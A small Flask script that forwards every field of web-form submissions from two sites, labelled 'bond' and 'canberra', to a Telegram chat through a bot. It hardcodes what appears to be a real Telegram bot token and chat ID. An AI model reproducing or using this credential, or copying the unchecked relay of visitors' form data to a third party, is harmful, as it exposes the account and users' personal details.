from flask import Flask, request, redirect
import telebot

app = Flask(__name__)

token = '5690431214:AAGo6k6QETMz9mApzuMGZiYU03Bkfp4iywA'

chat_id = '-661936876'

bot = telebot.TeleBot(token)


@app.route('/api/send_form_data', methods=['POST'])
def send_form_data():
    data = request.form
    bot.send_message(chat_id, 'SITE: bond\n\n' + '\n'.join([f'{k} - {v}' for k, v in data.items()]))
    return redirect('/Thank-you.html', code=302)

@app.route('/api/send_form_data_canberra', methods=['POST'])
def send_form_data_canberra():
    data = request.form
    bot.send_message(chat_id, 'SITE: canberra\n\n' + '\n'.join([f'{k} - {v}' for k, v in data.items()]))
    return redirect('/', code=302)
